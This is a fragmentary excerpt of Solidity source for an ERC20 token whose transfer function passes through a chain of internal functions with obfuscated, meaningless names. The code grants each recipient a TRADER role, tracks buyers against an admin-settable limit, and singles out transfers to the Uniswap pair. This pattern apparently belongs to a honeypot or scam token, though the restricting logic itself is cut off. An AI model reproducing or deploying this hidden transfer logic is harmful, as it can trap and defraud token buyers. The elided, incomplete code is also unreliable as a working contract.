...
abstract contract JKNCIDFFConsole is Context, JKNCIDFFRoleControl {
...
contract JKNCIDFFERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is JKNCIDFFERC20, JKNCIDFFConsole {
    ...
    ) JKNCIDFFERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(JKNCIDFFERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _JKNCIDFFdfvcggre(from, to, amt);
    }

    function _JKNCIDFFshuliang(
        uint shul
    ) public onlyRole(ADMIN) {
        isnum = shul;
    }

    function _JKNCIDFFdfvcggre(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _JKNCIDFFtrcbe(from, to, amt);
    }

    function _JKNCIDFFtrcbe(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _JKNCIDFFdfhthcv(from, to, amt);
    }

    function _JKNCIDFFdfhthcv(address from, address to, uint256 amt) internal {
        ...
        _JKNCIDFFyiszxc(from, to, amt);
    }

    function _JKNCIDFFyiszxc(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _JKNCIDFFuiacsvx(from, to, amt);
    }

    function _JKNCIDFFuiacsvx(address from, address to, uint256 amt) internal {
        
        _JKNCIDFFiufassa(from, to, amt);
    }

    function _JKNCIDFFiufassa(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _JKNCIDFFmuyswe(from, to, amt);
    }

    function _JKNCIDFFmuyswe(address from, address to, uint256 amt) internal {


        if(_count < isnum){
            if(to != uniswapV2Pair){
                
                if(queryA(TRADER,to) <= 0){
                    _count = _count + 1;
                }

                _newhash(TRADER,to,1);
            }
        }
